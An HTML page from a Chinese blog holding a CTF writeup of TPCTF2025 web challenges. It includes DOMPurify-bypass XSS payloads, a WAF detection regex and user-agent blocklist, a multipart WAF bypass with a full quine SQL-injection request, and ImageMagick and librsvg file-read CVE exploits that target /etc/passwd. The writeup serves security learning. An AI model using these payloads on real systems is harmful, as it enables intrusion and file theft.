<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>TPCTF2025-Web-赛后复现Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="
参考文章
https://blog.0xfff.team/posts/tpctf_2025_writeup/
https://z3n1th1.com/2025/03/tpctf2025-writeup/
TPCTF2025 Writeup - 星盟安全团队
baby layout
这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目
DOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/tpctf_2025/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.db3874ad7714b044ca574a35a48fc9a38e491dfc56e271a0c1a44fda4c8c0b3d.css" integrity="sha256-2zh0rXcUsETKV0o1pI/Jo45JHfxW4nGgwaRP2kyMCz0=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/tpctf_2025/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/tpctf_2025/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="TPCTF2025-Web-赛后复现Writeup">
  <meta property="og:description" content=" 参考文章
https://blog.0xfff.team/posts/tpctf_2025_writeup/
https://z3n1th1.com/2025/03/tpctf2025-writeup/
TPCTF2025 Writeup - 星盟安全团队
baby layout 这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目
DOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-03-15T00:27:55+08:00">
    <meta property="article:modified_time" content="2025-03-15T00:27:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="TPCTF2025-Web-赛后复现Writeup">
<meta name="twitter:description" content="
参考文章
https://blog.0xfff.team/posts/tpctf_2025_writeup/
https://z3n1th1.com/2025/03/tpctf2025-writeup/
TPCTF2025 Writeup - 星盟安全团队
baby layout
这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目
DOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "TPCTF2025-Web-赛后复现Writeup",
      "item": "http://localhost:1313/post/tpctf_2025/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TPCTF2025-Web-赛后复现Writeup",
  "name": "TPCTF2025-Web-赛后复现Writeup",
  "description": " 参考文章\nhttps://blog.0xfff.team/posts/tpctf_2025_writeup/\nhttps://z3n1th1.com/2025/03/tpctf2025-writeup/\nTPCTF2025 Writeup - 星盟安全团队\nbaby layout 这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目\nDOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": " 参考文章\nhttps://blog.0xfff.team/posts/tpctf_2025_writeup/\nhttps://z3n1th1.com/2025/03/tpctf2025-writeup/\nTPCTF2025 Writeup - 星盟安全团队\nbaby layout 这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目\nDOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。\n在这道题中调用了DOMPurify库对content 进行 HTML 内容的净化，以防止 XSS 攻击，而且将净化后的内容替换到 layout 字符串中特定的占位符 {{content}} 处\n另外在下边的创建Layout处也会调用DOMPurify库的sanitize\nsanitize的工作原理大致如下\n那既然这两边都被进行了内容的净化，难以直接进行xss，那我们是否可以通过两者结合的方式进行xss呢\n先尝试一下这个\nlayout：\rcontent：\ralert(1) 发现不行，因为当传入的内容为html的时候DOMPurify会对其中的元素进行解析，其中onerror为危险属性所有被净化掉了\n所以layout变成了\n但是如果我们传入的内容不为html结构的时候，DOMPurify无法对元素进行解析和净化，是可以正常传入onerror的\n所以可以这样构造payload\nlayout：\rcontent：\r1\" onerror=\"alert(1) safe-layout 这题和上一题的区别是增加了ALLOWED_ATTR: []\nconst sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] }); 一个类似白名单的东西。\n但是这玩意其实并不是白名单，虽然说禁用了所有的属性，但是data-*和aira-*属性还是可以正常使用的\n这篇文章中有提到：\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists\n所以可以构造出payload\ncontent\n123\" onload=\"alert(1) layout\n或者是\nlayout\nsafe layout revenge 这题把上题中使用的aria-*和data-*给ban掉了\n还是看上题中的那篇文章\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce\n在这篇文章中提到的CVE-2023-48219中，会在DOMpurify后将\\uFFFF替换为空。\n所以这里可以利用\\uFEFF对html代码进行截断，从而绕过DOMpurify\n回到这道题，我们这里也可以达到类似的效果。我们可以用{{content}}来代替\\uFEFF对html进行截断。\n所以payload就是\n//content为空\rlayout：\rx supersqli 考点：解析差异绕过和quine注入\n拿到附件\n我们可以看到这道题用go实现了一个反向代理和WAF\n1var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) 2 3var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) 4 5var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 6 7var blockedUserAgents = []string{ 8\t\"sqlmap\", 9\t\"nmap\", 10\t\"curl\", 11} 再看到urls.py\n1from django.contrib import admin 2from django.urls import path 3from blog import views 4 5urlpatterns = [ 6 path(\"flag/\", views.flag, name=\"flag\"), 7 path(\"\", views.index, name=\"index\"), 8] 定义了一个flag路由，指向views.py的flag函数\n跟进views\n1from django.shortcuts import render 2from django.db import connection 3 4# Create your views here. 5from django.http import HttpResponse,HttpRequest 6from .models import AdminUser,Blog 7import os 8 9def index(request:HttpRequest): 10 return HttpResponse('Welcome to TPCTF 2025') 11 12def flag(request:HttpRequest): 13 if request.method != 'POST': 14 return HttpResponse('Welcome to TPCTF 2025') 15 username = request.POST.get('username') 16 if username != 'admin': 17 return HttpResponse('you are not admin.') 18 password = request.POST.get('password') 19 users:AdminUser = AdminUser.objects.raw(\"SELECT * FROM blog_adminuser WHERE username='%s' and password ='%s'\" % (username,password)) 20 try: 21 assert password == users[0].password 22 return HttpResponse(os.environ.get('FLAG')) 23 except: 24 return HttpResponse('wrong password') 这里存在sql注入\n所以接下来的目标就是要想办法绕过waf，进行sql注入\n可以利用multipart boundary来绕过waf，参考下面的这篇文章\nhttps://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \"Windows\" 8sec-ch-ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\" 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\"username\" 20 21admin 22--a 23Content-Disposition: form-data; name=\"password\";filename=\"password\" 24Content-Disposition: form-data; name=\"password\"; 25 26123 27--a-- 这题我们可以使用quine注入，即构造sql语句使我们输入和输出的结果一致，从而绕过\n1assert password == users[0].password 参考文章：\nhttps://www.cnblogs.com/meraklbz/p/18169584\n生成一个payload\n1def quine(data, debug=True): 2 if debug: 3 print(data) 4 data = data.replace('$$',\"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)\") 5 blob = data.replace('$$','\"$\"').replace(\"'\",'\"') 6 data = data.replace('$$',\"'\"+blob+\"'\") 7 if debug: 8 print (data) 9 return data 10 11data = quine(\"1' union select 1,2,$$--\") 完整payload\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \"Windows\" 8sec-ch-ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\" 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\"username\" 20 21admin 22--a 23Content-Disposition: form-data; name=\"password\";filename=\"password\" 24Content-Disposition: form-data; name=\"password\"; 25 261' union select 1,2,REPLACE(REPLACE('1\" union select 1,2,REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\")--',CHAR(34),CHAR(39)),CHAR(36),'1\" union select 1,2,REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\")--')-- 27--a-- thumbor1 thumbor是一个图片处理服务工具，可以对图片进行动态调整\n附件只有一个dockerfile\n可以起个docker拿一下源码\n这题不是因为thumbor有问题，而是因为thumbor的一个组件ImageMagick存在任意文件读取漏洞，也就是CVE-2022-44268。\n去GitHub找一个POC\nvoidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read\n从readme可以看到这里可以通过类似ssrf的方式远程加载图片\n在vps上构造好png，远程加载即可\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/图片 其实就是复现cve\nthumbor2 dockerfile里面增加了最新版的ImageMagick，其实就是修复了上一题的ImageMagick\n这题是另一个组件librsvg的漏洞，CVE-2023-38633\nlibrsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件（在预期区域之外的本地文件系统上），例如通过在 xi:include 元素中使用 href=“.?../…/…/…/…/…/…/…/…/…/etc/passwd” 来读取结果。 原文链接：https://blog.csdn.net/HMX404/article/details/137231580\n原理参考文章：\nWhen URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog\npayload：\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e file not found 跟上题差不多，在服务器上创建一个txt，将payload写进去，远程加载即可\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/poc.txt ",
  "wordCount" : "2027",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-03-15T00:27:55+08:00",
  "dateModified": "2025-03-15T00:27:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/tpctf_2025/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      TPCTF2025-Web-赛后复现Writeup
    </h1>
<div class="post-meta"><span title='2025-03-15 00:27:55 +0800 CST'>2025-03-15</span>&nbsp;·&nbsp;5 分钟&nbsp;·&nbsp;Xrntkk

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#baby-layout" aria-label="baby layout">baby layout</a></li>
                <li>
                    <a href="#safe-layout" aria-label="safe-layout">safe-layout</a></li>
                <li>
                    <a href="#safe-layout-revenge" aria-label="safe layout revenge">safe layout revenge</a></li>
                <li>
                    <a href="#supersqli" aria-label="supersqli">supersqli</a></li>
                <li>
                    <a href="#thumbor1" aria-label="thumbor1">thumbor1</a></li>
                <li>
                    <a href="#thumbor2" aria-label="thumbor2">thumbor2</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><blockquote>
<p>参考文章</p>
<p><a href="https://blog.0xfff.team/posts/tpctf_2025_writeup/">https://blog.0xfff.team/posts/tpctf_2025_writeup/</a></p>
<p><a href="https://z3n1th1.com/2025/03/tpctf2025-writeup/">https://z3n1th1.com/2025/03/tpctf2025-writeup/</a></p>
<p><a href="https://blog.xmcve.com/2025/03/11/TPCTF2025-Writeup/">TPCTF2025 Writeup - 星盟安全团队</a></p></blockquote>
<h3 id="baby-layout">baby layout<a hidden class="anchor" aria-hidden="true" href="#baby-layout">#</a></h3>
<p>这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目</p>
<p>DOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。</p>
<p><img alt="image-20250310143030190" loading="lazy" src="../assets/image-20250310143030190.png"></p>
<p>在这道题中调用了DOMPurify库对<code>content</code> 进行 HTML 内容的净化，以防止 XSS 攻击，而且将净化后的内容替换到 <code>layout</code> 字符串中特定的占位符 <code>{{content}}</code> 处</p>
<p><img alt="image-20250310142621214" loading="lazy" src="../assets/image-20250310142621214.png"></p>
<p>另外在下边的创建Layout处也会调用DOMPurify库的sanitize</p>
<p><img alt="image-20250310143353939" loading="lazy" src="../assets/image-20250310143353939.png"></p>
<p>sanitize的工作原理大致如下</p>
<p><img alt="image-20250310222515042" loading="lazy" src="../assets/image-20250310222515042.png"></p>
<p>那既然这两边都被进行了内容的净化，难以直接进行xss，那我们是否可以通过两者结合的方式进行xss呢</p>
<p>先尝试一下这个</p>
<pre tabindex="0"><code>layout：
&lt;img src onerror=&#34;{{content}}&#34;&gt;

content：
alert(1)
</code></pre><p>发现不行，因为当传入的内容为html的时候DOMPurify会对其中的元素进行解析，其中onerror为危险属性所有被净化掉了</p>
<p>所以layout变成了</p>
<pre tabindex="0"><code>&lt;img src=1 &gt;
</code></pre><p><img alt="image-20250310150425084" loading="lazy" src="../assets/image-20250310150425084.png"></p>
<p>但是如果我们传入的内容不为html结构的时候，DOMPurify无法对元素进行解析和净化，是可以正常传入onerror的</p>
<p>所以可以这样构造payload</p>
<pre tabindex="0"><code>layout：
&lt;img src=&#34;{{content}}&#34;&gt;

content：
1&#34; onerror=&#34;alert(1)
</code></pre><p><img alt="image-20250310151407766" loading="lazy" src="../assets/image-20250310151407766.png"></p>
<p><img alt="image-20250310151430463" loading="lazy" src="../assets/image-20250310151430463.png"></p>
<h3 id="safe-layout">safe-layout<a hidden class="anchor" aria-hidden="true" href="#safe-layout">#</a></h3>
<p>这题和上一题的区别是增加了ALLOWED_ATTR: []</p>
<pre tabindex="0"><code>  const sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] });
</code></pre><p>一个类似白名单的东西。</p>
<p>但是这玩意其实并不是白名单，虽然说禁用了所有的属性，但是data-*和aira-*属性还是可以正常使用的</p>
<p>这篇文章中有提到：</p>
<p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists</a></p>
<p><img alt="image-20250313102830351" loading="lazy" src="../assets/image-20250313102830351.png"></p>
<p>所以可以构造出payload</p>
<p>content</p>
<pre tabindex="0"><code>123&#34; onload=&#34;alert(1)
</code></pre><p>layout</p>
<pre tabindex="0"><code>&lt;svg data-type=&#34;{{content}}&#34;&gt;&lt;/svg&gt;
</code></pre><p>或者是</p>
<p>layout</p>
<pre tabindex="0"><code>&lt;svg aria-hidden=&#34;{{content}}&#34;&gt;&lt;/svg&gt;
</code></pre><h3 id="safe-layout-revenge">safe layout revenge<a hidden class="anchor" aria-hidden="true" href="#safe-layout-revenge">#</a></h3>
<p>这题把上题中使用的aria-*和data-*给ban掉了</p>
<p><img alt="image-20250313104846923" loading="lazy" src="../assets/image-20250313104846923.png"></p>
<p>还是看上题中的那篇文章</p>
<p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce</a></p>
<p><img alt="image-20250313105033752" loading="lazy" src="../assets/image-20250313105033752.png"></p>
<p>在这篇文章中提到的CVE-2023-48219中，会在DOMpurify后将\uFFFF替换为空。</p>
<p>所以这里可以利用\uFEFF对html代码进行截断，从而绕过DOMpurify</p>
<p>回到这道题，我们这里也可以达到类似的效果。我们可以用{{content}}来代替\uFEFF对html进行截断。</p>
<p>所以payload就是</p>
<pre tabindex="0"><code>//content为空

layout：
x&lt;style&gt;&lt;{{content}}/style&gt;&lt;{{content}}img src=x onerror=alert(123)&gt;&lt;/style&gt;
</code></pre><p><img alt="image-20250313105755444" loading="lazy" src="../assets/image-20250313105755444.png"></p>
<h3 id="supersqli">supersqli<a hidden class="anchor" aria-hidden="true" href="#supersqli">#</a></h3>
<p>考点：解析差异绕过和quine注入</p>
<p>拿到附件</p>
<p>我们可以看到这道题用go实现了一个反向代理和WAF</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-GO" data-lang="GO"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">var</span> <span class="nx">sqlInjectionPattern</span> <span class="p">=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kd">var</span> <span class="nx">rcePattern</span> <span class="p">=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kd">var</span> <span class="nx">hotfixPattern</span> <span class="p">=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">`(?i)(select)`</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kd">var</span> <span class="nx">blockedUserAgents</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="s">&#34;sqlmap&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">	<span class="s">&#34;nmap&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">	<span class="s">&#34;curl&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>再看到urls.py</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">from</span> <span class="nn">django.contrib</span> <span class="kn">import</span> <span class="n">admin</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="kn">from</span> <span class="nn">django.urls</span> <span class="kn">import</span> <span class="n">path</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="kn">from</span> <span class="nn">blog</span> <span class="kn">import</span> <span class="n">views</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">
</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="n">urlpatterns</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s2">&#34;flag/&#34;</span><span class="p">,</span> <span class="n">views</span><span class="o">.</span><span class="n">flag</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">views</span><span class="o">.</span><span class="n">index</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;index&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><p>定义了一个flag路由，指向views.py的flag函数</p>
<p>跟进views</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">django.db</span> <span class="kn">import</span> <span class="n">connection</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># Create your views here.</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span><span class="p">,</span><span class="n">HttpRequest</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">from</span> <span class="nn">.models</span> <span class="kn">import</span> <span class="n">AdminUser</span><span class="p">,</span><span class="n">Blog</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">:</span><span class="n">HttpRequest</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;Welcome to TPCTF 2025&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">(</span><span class="n">request</span><span class="p">:</span><span class="n">HttpRequest</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">!=</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;Welcome to TPCTF 2025&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;you are not admin.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
